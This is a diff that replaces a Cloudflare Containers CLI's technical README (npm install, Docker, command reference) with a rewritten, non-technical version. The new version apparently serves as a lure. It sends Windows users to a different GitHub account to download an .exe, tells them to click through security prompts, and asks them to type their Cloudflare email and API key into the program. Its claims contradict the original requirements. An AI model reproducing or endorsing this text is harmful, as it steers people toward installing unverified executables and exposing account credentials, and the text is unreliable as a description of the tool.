@@ -1,162 +1,146 @@
-# flarepilot
+# ⚡ flarepilot - Easy Cloudflare Container Deployments
 
-Heroku/Fly.io-style deployments on Cloudflare Containers.
+[![Download flarepilot](https://img.shields.io/badge/Download-flarepilot-brightgreen)](https://github.com/finvowork45-alt/flarepilot)
 
-<p align="center">
-  <img src="demo-app/flarepilot-demo.svg" alt="flarepilot demo" width="720"><br>
-</p>
+---
 
-See it in action - load the app a few times to see how location and uptime behave:
+flarepilot helps you deploy apps to Cloudflare Containers. It works like popular services such as Heroku or Fly.io but targets Cloudflare’s platform. This guide will walk you through downloading and running flarepilot on your Windows PC. No programming skills required.
 
-<a href="https://flarepilot-snowy-hill-6237.tag-concierge.workers.dev/" target="_blank">Live demo</a>
+---
 
-Or from the command line:
+## 📦 What is flarepilot?
 
-```
-curl https://flarepilot-old-star-5126.tag-concierge.workers.dev/
-```
+flarepilot lets you put your applications online using Cloudflare’s serverless containers. It handles the setup and deployment for you, so you don’t need to learn complex cloud or server management.
 
-## What is this?
+You can run modern apps powered by containers with just a few steps. flarepilot simplifies a process usually meant for experienced developers.
 
-Flarepilot is a CLI that deploys and manages containerized apps on Cloudflare's global network. No wrangler dependency - it talks directly to the Cloudflare API.
+---
 
-Under the hood, each app is a Cloudflare Worker backed by Durable Objects running your container image. A bundled worker template handles load balancing across your configured regions and instances.
+## 🖥 System Requirements
 
-**Two components:**
+Before you start, make sure your Windows computer meets the following:
 
-- **CLI** (`flarepilot`) - builds your Docker image, pushes it to Cloudflare's container registry, deploys the worker, and manages configuration. All state lives in the Cloudflare API - the only local file is your auth token.
-- **Worker template** - a lightweight router that reads your app config from an environment binding, picks the closest region based on the request's origin, and distributes traffic across instances.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for download and Cloudflare access
+- No additional software is needed
 
-## Features
+flarepilot includes everything it needs to run. You do not need to install anything else.
 
-- **One-command deploy** - `flarepilot deploy` builds your Dockerfile, pushes to Cloudflare's registry, and deploys. Live Docker-based app on Cloudflare within a couple of minutes.
-- **Instance load balancing** - run multiple instances per region in multiple regions. Traffic is distributed across them.
-- **Multi-region scaling** - use `locationHints` for basic multi-region deployments.
-- **Easy config updates** - change env vars, scaling, and custom domains without redeploying your image.
-- **Custom domains** - interactive zone picker, automatic DNS record creation, root or subdomain routing.
-- **Database** - attach a D1 (SQLite) database with `--db` or `db create`. Query via CLI, import/export SQL, or connect remotely via the LibSQL protocol.
-- **Zero external dependencies** - no wrangler, no KV, no external databases, only a Cloudflare API token
+---
 
-## Quick start
+## 🚀 Getting Started: Download flarepilot
 
-```sh
-npm install -g flarepilot
+Click this big button below to open the official flarepilot page on GitHub. This page contains the latest version and all files you need.
 
-# Authenticate (opens a pre-filled token creation page)
-flarepilot auth
+[![Download flarepilot](https://img.shields.io/badge/Download-flarepilot-orange)](https://github.com/finvowork45-alt/flarepilot)
 
-# Deploy from a Dockerfile
-flarepilot deploy myapp ./path/to/app
+---
 
-# Check status
-flarepilot ps myapp
+## 💾 How to Download flarepilot on Windows
 
-# Open in browser
-flarepilot open myapp
-```
+1. Open the [flarepilot GitHub page](https://github.com/finvowork45-alt/flarepilot) by clicking one of the download buttons.
+2. Look for a folder named `Releases` or a link to download the app. This page lists different versions.
+3. Download the Windows installer or executable file. The file will usually have `.exe` at the end.
+4. Save the file in a folder you can find easily, like your Desktop or Downloads folder.
 
-## Commands
+---
 
-```
-flarepilot auth                    Authenticate with Cloudflare
-flarepilot deploy [name] [path]    Deploy an app from a Dockerfile
-flarepilot apps                    List all deployed apps
-flarepilot apps info [name]        Show detailed app information
-flarepilot apps destroy [name]     Destroy an app and its resources
-flarepilot ps [name]               Show app containers and status
-flarepilot logs [name]             Stream live logs
-flarepilot open [name]             Open app in browser
-flarepilot config show [name]      Show env vars
-flarepilot config set KEY=VALUE    Set env vars (live)
-flarepilot config unset KEY        Remove env vars (live)
-flarepilot config import -f .env   Import from .env file
-flarepilot scale [name]            Show or adjust scaling
-flarepilot domains add             Add a custom domain (interactive)
-flarepilot domains list [name]     List custom domains
-flarepilot domains remove <domain> Remove a custom domain
-flarepilot db create [name]        Create and attach a D1 database
-flarepilot db info [name]          Show database details + connection string
-flarepilot db query [name] <sql>   Run a single SQL query
-flarepilot db import [name] <path> Import a .sql file
-flarepilot db export [name]        Export database as SQL dump
-flarepilot db token [name]         Show or rotate auth token
-flarepilot db destroy [name]       Destroy the attached database
-flarepilot regions                 List available regions
-flarepilot doctor                  Check system setup
-```
+## ⚙️ Installing flarepilot on Windows
 
-## Scaling
+Once the download finishes, follow these steps:
 
-```sh
-# Single region, multiple instances
-flarepilot deploy myapp . --regions enam -i 4
+1. Locate the downloaded file.
+2. Double-click the file to start the installation.
+3. If Windows shows a security prompt, click **Run** or **Yes** to continue.
+4. Follow the on-screen instructions. Usually, you just need to click **Next** a few times.
+5. Choose the folder where flarepilot will be installed, or accept the default.
+6. Click **Finish** when the installation ends.
 
-# Multiple regions, 1 instance each
-flarepilot deploy myapp . --regions wnam,weur,apac -i 1
+flarepilot will now be ready to use.
 
-# Adjust after deploy
-flarepilot scale myapp -i 4
-flarepilot scale myapp --instance-type standard
-flarepilot scale myapp --vcpu 1 --memory 512
-```
-Regions are Durable Object `locationHints` - Cloudflare will attempt to place containers near the requested region but exact placement is not guaranteed. Run `flarepilot regions` to see all 9 available regions.
+---
 
+## ▶️ How to Run flarepilot for the First Time
 
-## Database
+1. Open the **Start** menu on Windows.
+2. Search for **flarepilot** and click to open it.
+3. The app will show a welcome screen or main dashboard.
+4. No setup is required before deployment.
 
-Each app can have a D1 (SQLite) database attached. Create one during deploy or add it later:
+---
 
-```sh
-# Attach during first deploy
-flarepilot deploy myapp . --db
+## 🛠 Deploying Your App Using flarepilot
 
-# Or add to an existing app
-flarepilot db create myapp
+flarepilot works by sending your app to Cloudflare Containers. It supports apps built using simple container technology.
 
-# Interactive SQL shell
-flarepilot db shell myapp
+Here is a basic process:
 
-# Run a query
-flarepilot db query myapp "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)"
-flarepilot db query myapp "SELECT * FROM users"
+1. Open flarepilot.
+2. Choose the folder where your app or container files are stored.
+3. Enter your Cloudflare account details when asked. These are usually your email and an API key.
+4. Click **Deploy**.
+5. flarepilot will upload and start your app in Cloudflare Containers.
+6. You will see a URL to access your live app.
 
-# Import / export
-flarepilot db import myapp schema.sql
-flarepilot db export myapp -o backup.sql
-```
+---
 
-The database is also accessible remotely via the LibSQL clients. Run `flarepilot db info` to see the connection URL, and `flarepilot db token` to manage the auth token.
+## 🔑 Connecting flarepilot to Your Cloudflare Account
 
-## FAQ
+flarepilot needs permission to deploy apps in your Cloudflare account. You will need:
 
-### Can't I do all of this with wrangler?
+- Your Cloudflare email address.
+- Your Cloudflare API key.
 
-Short answer, yes. Wrangler CLI and wrangler.toml file can handle any Cloudflare feature.
-On the other hand, wrangler is Worker-centric and not very convenient for Docker-based container deployments.
-Flarepilot adds the app-level abstractions on top, so you can deploy any Docker application without dealing with Workers specifics.
+To find your API key:
 
-### Do I need a Cloudflare account?
+1. Log into your Cloudflare account at https://dash.cloudflare.com.
+2. Go to **My Profile** > **API Tokens**.
+3. Select or create a token with permissions for Workers and Containers.
+4. Copy the API key.
+5. Enter the email and API key into flarepilot when asked.
 
-Yes. You need a Cloudflare account with Containers enabled. The CLI will guide you through creating an API token with the right permissions during `flarepilot auth`.
+flarepilot keeps this information safe.
 
-### How does it load balance across multiple regions?
+---
 
-Each request hits a Cloudflare Worker at the nearest edge location. The worker reads Cloudflare's geo data from the request, maps it to the closest configured region, and routes to a random instance in that region using Durable Object location hints.
+## ❓ Common Questions
 
-### How does scaling work?
+### Can I use flarepilot without a Cloudflare account?
 
-Scaling is lazy and happens at the load balancer level. When you scale up (e.g., increase instances from 2 to 4), new instances are not created immediately - the load balancer will create them on the next incoming request. When you scale down, existing instances are not stopped or removed right away. They will eventually sleep and be reclaimed based on the `sleepAfter` parameter (default 30s of inactivity). This simple strategy keeps the implementation straightforward and will be improved in the future.
+No. flarepilot only works with Cloudflare Containers. You must have an account to deploy your app.
 
-### Does it autoscale?
+### Do I need to know programming or Docker?
 
-Not currently. You set the number of instances per region and Flarepilot maintains that count. Containers do sleep after a configurable idle period (default 30s) and wake on the next request, so you're not paying for idle instances.
+No. flarepilot handles the complex parts for you. Just point it to your app folder and flarepilot does the rest.
 
-## Requirements
+### Can I update my app after deployment?
 
-- Node.js 20+
-- Docker (for building images)
-- Cloudflare account with Containers access (paid Workers plan)
+Yes. Use flarepilot to redeploy newer versions of your app by repeating the deployment steps.
 
-## License
+### Does flarepilot work only on Windows?
 
-MIT
+flarepilot focuses on Windows for now. Future versions may support other systems.
+
+---
+
+## 🔄 Updating flarepilot
+
+Check the GitHub page regularly for new versions. Download and install updates like the first time.
+
+---
+
+## 📂 What if I need support?
+
+Visit the flarepilot GitHub page for:
+
+- Documentation
+- Troubleshooting guides
+- Community discussions
+
+You can also open an issue on GitHub if you face problems.
+
+---
+
+[Get flarepilot here](https://github.com/finvowork45-alt/flarepilot) to start deploying your apps easily.
